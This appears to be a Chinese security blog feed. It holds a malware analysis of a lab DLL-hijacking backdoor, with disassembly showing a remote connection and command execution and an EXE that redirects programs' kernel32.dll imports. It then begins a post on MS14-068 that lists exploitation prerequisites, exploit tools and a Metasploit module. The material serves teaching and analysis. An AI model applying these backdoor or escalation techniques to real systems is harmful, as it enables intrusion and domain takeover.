<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="0x01-DLL文件"><a href="#0x01-DLL文件" class="headerlink" title="0x01 DLL文件"></a>0x01 DLL文件</h3><p>几个导入函数。包括 <code>CreateProcessA</code>以及<code>WS2_32.dll</code> 的通过网络接收和发送数据的函数。<img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030170613133.png" alt="image-20211030170613133"></p>
<p>但是该dll文件的字符串很有意思，其中还包括了一个 IP地址 <code>127.26.152.13</code></p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030180036980.png" alt="image-20211030180036980"></p>
<p>另一点比较奇怪的是该dll文件并没有导出函数。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030180645492.png" alt="image-20211030180645492"></p>
<p>那就先从入口点分析吧。但是……指令贼多，一句一句分析效率太慢了。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030181141170.png" alt="image-20211030181141170"></p>
<p>先看call 指令调用的函数吧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10001015 			call 	alloca_ probe		//调用库函数__alloca_probe分配栈空间</span><br><span class="line">10001059 			call 	ds:OpenMutexA		//打开互斥量</span><br><span class="line">1000106E 			call 	ds:CreateMutexA		//创建互斥量  这两个在一起保证同一时间只有这个程序的一个实例在运行</span><br><span class="line">1000107E 			call 	ds:WSAStartup		//WS2_32.dll的一个函数</span><br><span class="line">10001092 			call 	ds:socket</span><br><span class="line">100010AF 			call 	ds:inet addr</span><br><span class="line">100010BB 			call 	ds:htons</span><br><span class="line">100010CE 			call 	ds:connect</span><br><span class="line">10001101 			call 	ds:send</span><br><span class="line">10001113 			cal1 	ds:shutdown</span><br><span class="line">10001132 			call 	ds:recv				//一直到这里，都是为了建立网络连接socket通信</span><br><span class="line">1000114B 			call 	ebp;strncmp </span><br><span class="line">10001159 			call 	ds:Sleep</span><br><span class="line">10001170 			call 	ebp ; strncmp </span><br><span class="line">100011AF 			call 	ebx ; CreateProcessA	//创建进程</span><br><span class="line">100011C5 			call 	ds:Sleep			</span><br></pre></td></tr></table></figure>

<p>到这里大概可以猜一下，该dll文件建立通信后创建进程，很像我们建立shell的行为。</p>
<p>接下来看函数的具体参数。</p>
<p><code>connect</code>连接的是 <code>127.26.152.13</code>这个IP地址，并且端口是 50h，即80端口。emm80端口，猜测可能走http协议进行通信，找一下通信的流量</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030182855386.png" alt="image-20211030182855386"></p>
<p>这里 buf数组存入了 hello 字符串……好像cobalt strike里的娱乐弹窗……</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030183150593.png" alt="image-20211030183150593"></p>
<p>看下<code>recv</code>接收的流量。在 <code>10001124</code>处，lea 指令访问 buf，指针指向buf这块缓冲区，接着 <code>push</code>了3个参数，调用 <code>recv</code>指令，但这里好像也看不出来什么</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030183356506.png" alt="image-20211030183356506"></p>
<p>接着往下看。<code>1000114B</code>cmp 前面是不是 <code>sleep</code>字符串，它会在 <code>10001150</code>处检查是否返回值是否为0，如果是0，调用 <code>sleep</code>函数</p>
<p>也就是说如果远程shell终端发送的命令是sleep，则执行sleep函数</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030183957689.png" alt="image-20211030183957689"></p>
<p>到这里并没有结束，buf 缓冲区还在被使用。首先检查指令是不是 <code>exec</code>，如果是，<code>strncpy</code>函数返回0，顺序执行，直到 <code>100011AF</code>处创建进程。看到<code>CreateProcessA</code>有很多参数，不过最重要的还是 <code>lpCOmmandLine</code>，它来自<code>1000119B</code>处的 <code>CommandLine</code>,双击追踪这个参数发现它在栈空间中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:10001161 loc_10001161:                           ; CODE XREF: DllMain(x,x,x)+142↑j</span><br><span class="line">.text:10001161                 lea     edx, [esp+1208h+buf]</span><br><span class="line">.text:10001168                 push    4               ; MaxCount</span><br><span class="line">.text:1000116A                 push    edx             ; Str2</span><br><span class="line">.text:1000116B                 push    offset aExec    ; &quot;exec&quot;</span><br><span class="line">.text:10001170                 call    ebp ; strncmp</span><br><span class="line">.text:10001172                 add     esp, 0Ch</span><br><span class="line">.text:10001175                 test    eax, eax</span><br><span class="line">.text:10001177                 jnz     short loc_100011B6</span><br><span class="line">.text:10001179                 mov     ecx, 11h</span><br><span class="line">.text:1000117E                 lea     edi, [esp+1208h+StartupInfo]</span><br><span class="line">.text:10001182                 rep stosd</span><br><span class="line">.text:10001184                 lea     eax, [esp+1208h+ProcessInformation]</span><br><span class="line">.text:10001188                 lea     ecx, [esp+1208h+StartupInfo]</span><br><span class="line">.text:1000118C                 push    eax             ; lpProcessInformation</span><br><span class="line">.text:1000118D                 push    ecx             ; lpStartupInfo</span><br><span class="line">.text:1000118E                 push    0               ; lpCurrentDirectory</span><br><span class="line">.text:10001190                 push    0               ; lpEnvironment</span><br><span class="line">.text:10001192                 push    8000000h        ; dwCreationFlags</span><br><span class="line">.text:10001197                 push    1               ; bInheritHandles</span><br><span class="line">.text:10001199                 push    0               ; lpThreadAttributes</span><br><span class="line">.text:1000119B                 lea     edx, [esp+1224h+CommandLine]</span><br><span class="line">.text:100011A2                 push    0               ; lpProcessAttributes</span><br><span class="line">.text:100011A4                 push    edx             ; lpCommandLine</span><br><span class="line">.text:100011A5                 push    0               ; lpApplicationName</span><br><span class="line">.text:100011A7                 mov     [esp+1230h+StartupInfo.cb], 44h ; &#x27;D&#x27;</span><br><span class="line">.text:100011AF                 call    ebx ; CreateProcessA</span><br><span class="line">.text:100011B1                 jmp     loc_100010E9</span><br></pre></td></tr></table></figure>



<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030190854333.png" alt="image-20211030190854333"></p>
<p>追踪到dllmain函数这里，发现它的初始值是 0FFBh，同时<code>buf</code>的初始值是<code>1000h</code>，说明缓冲区从这里开始。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030191233951.png" alt="image-20211030191233951"></p>
<p>这里大概清楚了这个dll文件会创建进程来实现远程socket通信，对于攻击者来说就是弹shell，也就是后门。但是这个dll文件并没有导出函数，它怎么被调用执行啊……</p>
<p>先放一放，看看exe文件</p>
<h3 id="0x02-EXE文件"><a href="#0x02-EXE文件" class="headerlink" title="0x02 EXE文件"></a>0x02 EXE文件</h3><p>先看exe的导入表，其中几个重点关注下，当然不止这几个，这里我懒得敲了，等下逐个分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateFileMappingA</span><br><span class="line">CreateFileA</span><br><span class="line">CopyFileA</span><br></pre></td></tr></table></figure>

<p>很明显，这里exe文件并没有在运行时导入该dll文件，导入函数中没有 <code>LoadLibrary/ GetProcAddress</code>，与前面分析dll文件正好对应</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030174426383.png" alt="image-20211030174426383"></p>
<p>这几个字符串也是很有意思</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211030174914026.png" alt="image-20211030174914026"></p>
<p>来看一看main函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401440                 mov     eax, [esp+argc]</span><br><span class="line">.text:00401444                 sub     esp, 44h</span><br><span class="line">.text:00401447                 cmp     eax, 2</span><br><span class="line">.text:0040144A                 push    ebx</span><br><span class="line">.text:0040144B                 push    ebp</span><br><span class="line">.text:0040144C                 push    esi</span><br><span class="line">.text:0040144D                 push    edi</span><br><span class="line">.text:0040144E                 jnz     loc_401813</span><br><span class="line">.text:00401454                 mov     eax, [esp+54h+argv]</span><br><span class="line">.text:00401458                 mov     esi, offset aWarningThisWil ;&quot;WARNING_THIS_WILL_DESTROY_YOUR_MACHINE&quot;</span><br><span class="line">.text:0040145D                 mov     eax, [eax+4]</span><br><span class="line">.text:00401460</span><br><span class="line">.text:00401460 loc_401460:                             ; CODE XREF: _main+42↓j</span><br><span class="line">.text:00401460                 mov     dl, [eax]</span><br><span class="line">.text:00401462                 mov     bl, [esi]</span><br><span class="line">.text:00401464                 mov     cl, dl</span><br><span class="line">.text:00401466                 cmp     dl, bl</span><br><span class="line">.text:00401468                 jnz     short loc_401488</span><br><span class="line">.text:0040146A                 test    cl, cl</span><br><span class="line">.text:0040146C                 jz      short loc_401484</span><br><span class="line">.text:0040146E                 mov     dl, [eax+1]</span><br><span class="line">.text:00401471                 mov     bl, [esi+1]</span><br><span class="line">.text:00401474                 mov     cl, dl</span><br><span class="line">.text:00401476                 cmp     dl, bl</span><br><span class="line">.text:00401478                 jnz     short loc_401488</span><br><span class="line">.text:0040147A                 add     eax, 2</span><br><span class="line">.text:0040147D                 add     esi, 2</span><br><span class="line">.text:00401480                 test    cl, cl</span><br><span class="line">.text:00401482                 jnz     short loc_401460</span><br><span class="line">.text:00401484</span><br><span class="line">.text:00401484 loc_401484:                             ; CODE XREF: _main+2C↑j</span><br><span class="line">.text:00401484                 xor     eax, eax</span><br><span class="line">.text:00401486                 jmp     short loc_40148D</span><br></pre></td></tr></table></figure>

<p>先分析关键指令，在 <code>401447</code>处会比较 eax/argc （即传递的参数的个数）是否为2，如果不是2，跳转到 <code>101813</code>，程序终止，这里启动程序时添加参数是为了防止意外启动造成不必要的后果。否则继续执行。在 <code>401458</code>处将 “WARNING_THIS_WILL_DESTROY_YOUR_MACHINE” 字符串放入 esi 寄存器中，在 <code>40145D</code>中，eax 存储 argv[1]。接着比较 argv[1] 的值是不是  “WARNING_THIS_WILL_DESTROY_YOUR_MACHINE” ，如果不是，跳转到 <code>401488</code>,程序终止。注意在 <code>401482</code>处的跳转到 <code>401460</code>，往回跳转，很明显是个循环。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211102234302125.png" alt="image-20211102234302125"></p>
<p>接下来分析 <code>40148D</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040148D loc_40148D:                             ; CODE XREF: _main+46↑j</span><br><span class="line">.text:0040148D                 test    eax, eax</span><br><span class="line">.text:0040148F                 jnz     loc_401813</span><br><span class="line">.text:00401495                 mov     edi, ds:CreateFileA</span><br><span class="line">.text:0040149B                 push    eax             ; hTemplateFile</span><br><span class="line">.text:0040149C                 push    eax             ; dwFlagsAndAttributes</span><br><span class="line">.text:0040149D                 push    3               ; dwCreationDisposition</span><br><span class="line">.text:0040149F                 push    eax             ; lpSecurityAttributes</span><br><span class="line">.text:004014A0                 push    1               ; dwShareMode</span><br><span class="line">.text:004014A2                 push    80000000h       ; dwDesiredAccess</span><br><span class="line">.text:004014A7                 push    offset FileName ; &quot;C:\\Windows\\System32\\Kernel32.dll&quot;</span><br><span class="line">.text:004014AC                 call    edi ; CreateFileA</span><br><span class="line">.text:004014AE                 mov     ebx, ds:CreateFileMappingA</span><br><span class="line">.text:004014B4                 push    0               ; lpName</span><br><span class="line">.text:004014B6                 push    0               ; dwMaximumSizeLow</span><br><span class="line">.text:004014B8                 push    0               ; dwMaximumSizeHigh</span><br><span class="line">.text:004014BA                 push    2               ; flProtect</span><br><span class="line">.text:004014BC                 push    0               ; lpFileMappingAttributes</span><br><span class="line">.text:004014BE                 push    eax             ; hFile</span><br><span class="line">.text:004014BF                 mov     [esp+6Ch+hObject], eax</span><br><span class="line">.text:004014C3                 call    ebx ; CreateFileMappingA</span><br><span class="line">.text:004014C5                 mov     ebp, ds:MapViewOfFile</span><br><span class="line">.text:004014CB                 push    0               ; dwNumberOfBytesToMap</span><br><span class="line">.text:004014CD                 push    0               ; dwFileOffsetLow</span><br><span class="line">.text:004014CF                 push    0               ; dwFileOffsetHigh</span><br><span class="line">.text:004014D1                 push    4               ; dwDesiredAccess</span><br><span class="line">.text:004014D3                 push    eax             ; hFileMappingObject</span><br><span class="line">.text:004014D4                 call    ebp ; MapViewOfFile</span><br><span class="line">.text:004014D6                 push    0               ; hTemplateFile</span><br><span class="line">.text:004014D8                 push    0               ; dwFlagsAndAttributes</span><br><span class="line">.text:004014DA                 push    3               ; dwCreationDisposition</span><br><span class="line">.text:004014DC                 push    0               ; lpSecurityAttributes</span><br><span class="line">.text:004014DE                 push    1               ; dwShareMode</span><br><span class="line">.text:004014E0                 mov     esi, eax</span><br><span class="line">.text:004014E2                 push    10000000h       ; dwDesiredAccess</span><br><span class="line">.text:004014E7                 push    offset ExistingFileName ; &quot;Lab07-03.dll&quot;</span><br><span class="line">.text:004014EC                 mov     [esp+70h+argc], esi</span><br><span class="line">.text:004014F0                 call    edi ; CreateFileA</span><br><span class="line">.text:004014F2                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:004014F5                 mov     [esp+54h+var_4], eax</span><br><span class="line">.text:004014F9                 push    0               ; lpName</span><br><span class="line">.text:004014FB                 jnz     short loc_401503</span><br><span class="line">.text:004014FD                 call    ds:exit</span><br></pre></td></tr></table></figure>

<p>在<code>4014AC</code>处调用了 <code>CreateFileA</code>，接着还有 <code>CreateFileMappingA/MapViewOfFile/</code>，所以这么多函数到底干了什么？毋庸置疑的是 创建了 <code>Kernel32.dll</code>这个文件，<code>CreateFileMappingA</code>这是一个共享内存函数，会 创建一个文件映射对象，目的是为了写入内存中，这里的参数就是 <code>kernel32.dll</code>，接着利用<code>MapViewOfFile</code>将文件映射到进程地址空间</p>
<p>接着往下看，在 <code>4017D4</code>这里，调用了两个 <code>CloseHandle</code>，因为对前面的文件已经操作完毕。接着在 <code>4017F4</code>处调用 <code>CopyFileA</code>，将 恶意dll文件 copy为 kernel32.dll，这样就可以理解为什么 该恶意dll文件没有被导出了，很常规的一次dll劫持</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103000336042.png" alt="image-20211103000336042"></p>
<p>紧接着传入了C盘的盘符，调用了 <code>4011E0</code>，</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103001628051.png" alt="image-20211103001628051"></p>
<p>来到 <code>4011E0</code>处，只调用了 <code>FindFirstFileA</code>，来搜索C盘符，</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103001951131.png" alt="image-20211103001951131"></p>
<p>接下来的call指令就是 <code>stricmp</code>，找一下它push的参数，会比较字符串是否是<code>.exe</code>， </p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103002543690.png" alt="image-20211103002543690"></p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103002651417.png" alt="image-20211103002651417"></p>
<p>在这之后会调用 <code>FindNextFileA</code>，查找下一个文件，然后在 <code>401427</code>处jmp 到 <code>401210</code>，往前跳转，说明这是一个循环，然后在<code>40142E</code>处调用 <code>FindClose</code>函数，终止。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103003010628.png" alt="image-20211103003010628"></p>
<p>到这里，梳理一下，这个函数在找C盘里的exe文件，并且匹配相应的dll，接着进行一系列操作。</p>
<p>接着<code>call 4011A0</code>，看到 <code>4010A0</code>处的函数调用。</p>
<p>依旧是调用了 <code>CreateFileA/ CreateFileMappingA/ MapViewOfFile  </code>用来将文件映射到内存中。</p>
<p>接着调用 <code>IsBadReadPtr</code>函数，检查调用进程是否具有读取指定内存区域的权限。下面都是对该函数的一些算术运算，直接pass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004010A0                 sub     esp, 0Ch</span><br><span class="line">.text:004010A3                 push    ebx</span><br><span class="line">.text:004010A4                 mov     eax, [esp+10h+lpFileName]</span><br><span class="line">.text:004010A8                 push    ebp</span><br><span class="line">.text:004010A9                 push    esi</span><br><span class="line">.text:004010AA                 push    edi</span><br><span class="line">.text:004010AB                 push    0               ; hTemplateFile</span><br><span class="line">.text:004010AD                 push    0               ; dwFlagsAndAttributes</span><br><span class="line">.text:004010AF                 push    3               ; dwCreationDisposition</span><br><span class="line">.text:004010B1                 push    0               ; lpSecurityAttributes</span><br><span class="line">.text:004010B3                 push    1               ; dwShareMode</span><br><span class="line">.text:004010B5                 push    10000000h       ; dwDesiredAccess</span><br><span class="line">.text:004010BA                 push    eax             ; lpFileName</span><br><span class="line">.text:004010BB                 call    ds:CreateFileA</span><br><span class="line">.text:004010C1                 push    0               ; lpName</span><br><span class="line">.text:004010C3                 push    0               ; dwMaximumSizeLow</span><br><span class="line">.text:004010C5                 push    0               ; dwMaximumSizeHigh</span><br><span class="line">.text:004010C7                 push    4               ; flProtect</span><br><span class="line">.text:004010C9                 push    0               ; lpFileMappingAttributes</span><br><span class="line">.text:004010CB                 push    eax             ; hFile</span><br><span class="line">.text:004010CC                 mov     [esp+34h+var_4], eax</span><br><span class="line">.text:004010D0                 call    ds:CreateFileMappingA</span><br><span class="line">.text:004010D6                 push    0               ; dwNumberOfBytesToMap</span><br><span class="line">.text:004010D8                 push    0               ; dwFileOffsetLow</span><br><span class="line">.text:004010DA                 push    0               ; dwFileOffsetHigh</span><br><span class="line">.text:004010DC                 push    0F001Fh         ; dwDesiredAccess</span><br><span class="line">.text:004010E1                 push    eax             ; hFileMappingObject</span><br><span class="line">.text:004010E2                 mov     [esp+30h+hObject], eax</span><br><span class="line">.text:004010E6                 call    ds:MapViewOfFile</span><br><span class="line">.text:004010EC                 mov     esi, eax</span><br><span class="line">.text:004010EE                 test    esi, esi</span><br><span class="line">.text:004010F0                 mov     [esp+1Ch+var_C], esi</span><br><span class="line">.text:004010F4                 jz      loc_4011D5</span><br><span class="line">.text:004010FA                 mov     ebp, [esi+3Ch]</span><br><span class="line">.text:004010FD                 mov     ebx, ds:IsBadReadPtr</span><br><span class="line">.text:00401103                 add     ebp, esi</span><br><span class="line">.text:00401105                 push    4               ; ucb</span><br><span class="line">.text:00401107                 push    ebp             ; lp</span><br><span class="line">.text:00401108                 call    ebx ; IsBadReadPtr</span><br><span class="line">.text:0040110A                 test    eax, eax</span><br><span class="line">.text:0040110C                 jnz     loc_4011D5</span><br><span class="line">.text:00401112                 cmp     dword ptr [ebp+0], 4550h</span><br><span class="line">.text:00401119                 jnz     loc_4011D5</span><br><span class="line">.text:0040111F                 mov     ecx, [ebp+80h]</span><br><span class="line">.text:00401125                 push    esi</span><br><span class="line">.text:00401126                 push    ebp</span><br><span class="line">.text:00401127                 push    ecx</span><br><span class="line">.text:00401128                 call    sub_401040</span><br><span class="line">.text:0040112D                 add     esp, 0Ch</span><br><span class="line">.text:00401130                 mov     edi, eax</span><br><span class="line">.text:00401132                 push    14h             ; ucb</span><br><span class="line">.text:00401134                 push    edi             ; lp</span><br><span class="line">.text:00401135                 call    ebx ; IsBadReadPtr</span><br><span class="line">.text:00401137                 test    eax, eax</span><br><span class="line">.text:00401139                 jnz     loc_4011D5</span><br><span class="line">.text:0040113F                 add     edi, 0Ch</span><br></pre></td></tr></table></figure>



<p>继续往下看，找到了 <code>stricmp</code>函数调用，来检查 字符串是否是 <code>kernel32.dll</code>，接着在<code>401186</code>处调用 <code>repne scasb</code>，用来重复扫描特定字符串的长度， 在<code>401196</code>处调用 <code>rep movsd</code>。这里的用处和 <code>strlen+memcpy</code>函数是等价的。至于往内存中写入的是什么东西，看下edi寄存器里存的是什么，</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103004617789.png" alt="image-20211103004617789"></p>
<p>定位到<code>403010</code>处，</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103005237844.png" alt="image-20211103005237844"></p>
<p>这里存储的是 <code>kernel32.dll</code>这个字符串，按下A键，可以看到转换为了该字符串。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103005344307.png" alt="image-20211103005344307"></p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103005653578.png" alt="image-20211103005653578"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，梳理下，这个exe文件遍历C盘查找所有的 exe文件，并且找到其中 <code>kernel32.dll</code>的位置，并且用我们的恶意dll文件替换它，简单来说就是劫持 <code>kernel32.dll</code>。但是也不对啊，这个恶意dll只是实现了后门的功能，并没有正常<code>kernel32.dll</code>的功能，按理说劫持后exe文件会运行失败。</p>
<p>动态分析，在恶意代码运行后，正常<code>kernel32.dll</code>的md5并没有被改变，说明该dll没有被修改。而当我们再次看我们的恶意dll时，发现它导出了所有的<code>kernel32.dll</code>的导出函数，这些导出函数是重定向后的，相当于做了一次转发。功能还在原来的<code>kernel32.dll</code>上，只是程序运行时会加载我们的恶意dll。所以在main函数中访问 <code>kernel32.dll</code>和我们的恶意dll，是在解析<code>kernel32.dll</code>中的导出段并且在恶意dll中创建一个导出段，用来导出并转发函数。这是一个重定向转发dll劫持。</p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103011813447.png" alt="image-20211103011813447"></p>
<p><img src="/2021/11/10/DLL%E5%8A%AB%E6%8C%81%E8%BD%AC%E5%8F%91%E9%87%8D%E5%AE%9A%E5%90%91%E5%90%8E%E9%97%A8%E7%9A%84%E5%88%86%E6%9E%90/image-20211103011924433.png" alt="image-20211103011924433"></p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>后门</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>MS14-068原理浅析</title>
    <url>/2021/09/25/MS14-068%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>影响范围：全版本的Windows服务器</p>
<p>漏洞危害：允许任意域成员提权为域管权限</p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域控没有打KB3011780补丁</span><br><span class="line">2.一台域用户的权限</span><br><span class="line">3.域用户的用户名、密码/hash、SID</span><br><span class="line">4.域名和域控的IP</span><br></pre></td></tr></table></figure>

<p>利用工具：</p>
<p>kekeo                    下载地址：<a href="https://github.com/gentilkiwi/kekeo/">https://github.com/gentilkiwi/kekeo/</a></p>
<p>PyKEY 工具包       下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p>
<p>Ms14-068.exe     下载地址:<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<p>mimikatz              下载地址:<a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a></p>
<p>msf中的模块        use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</p>
<p>cs中的插件</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>主要是由于Kerberos协议中的认证问题。这里对Kerberos协议不作深入探讨。</p>
<p>下图是Kerberos协议的认证流程图</p>
<p><img src="/2021/09/25/MS14-068%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/image-20210925103321890.png" alt="image-20210925103321890"></p>
<p>搭配这张图更容易理解</p>
<p><img src="/2021/09/25/MS14-068%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/image-20210925103535675.png" alt="image-20210925103535675"></p>
<p>Kerberos认证流程大致是这样</p>
<ol>
<li><p>AS_REQ:    client向KDC的AS请求AS_REQ，请求时带上自己的凭据：client的hash加密的时间戳以及其他一些信息</p>
</li>
<li><p>AS_REP:    AS收到信息，去询问AD是否有这个用户，有就拿出NTLM-hash对AS_REQ请求中加密的时间戳进行解密，解密成功，就会返回用krbtgt hash加密的TGT票据，TGT里面包含PAC，PAC包含client的sid，client所在的组</p>
</li>
<li><p>TGS_REQ:  Client凭借TGT票据向KDC中的TGS发起针对特定服务的TGS_REQ请求</p>
</li>
<li><p>TGS_REP:  TGS使用krbtgt hash解密，结果正确，返回 Server hash加密的TGS票据（这一步没有验证client有没有访问服务的权限，只要TGT正确，就返回TGS票据）</p>
</li>
<li><p>AP_REQ:   Client拿着TGS票据去请求服务</p>
</li>
<li><p>AP_REP:  server使用自身的hash解密TGS。解密成功，server会拿着PAC去询问DC，该用户是否具有访问权限，DC拿到PAC后解密，获取client的sid以及所在的组信息，再根据该服务的ACL，判断client是否具有访问server的权限。通过认证后server 将返回最终的AP_REP并与client建立通信 (有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提)</p>
</li>
</ol>
<p>至此，Kerberos协议认证基本结束。只是大概讲一下认证流程，很多细节认证没有讲。</p>
<p>关键来了，第4步中没有验证client是否具有访问server的权限，在上述认证流程中，只要用户的hash正确，就可以拿到TGT，继而拿到TGS去访问服务。就是说上面的认证只解决了“Who am I”的问题，而没有解决 “ What can I do” 的问题</p>
<p>因此微软引进了 PAC</p>
<p>PAC包含Client的User的SID、Group的SID。PAC决定了Client的组属性，即决定了Client的权限PAC为了保证自身的合法性，还包含2个签名，Key为krbtgt的NTLM hash，签名的内容除了User SID、Group SID外，还有其他部分PAC作为TGT的一部分，是加密的，key为krbtgt的NTLM hash。Client向KDC的AS模块发起认证请求，AS返回TGT时，会根据Client所在的组，生成PAC，包含Client的User SID、Group SID，以及用于确保PAC不被篡改的2个签名</p>
<p>PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。但也恰恰是这个 PAC 造成了 MS14-068 这个漏洞。</p>
<p>更多关于PAC的介绍参考链接：</p>
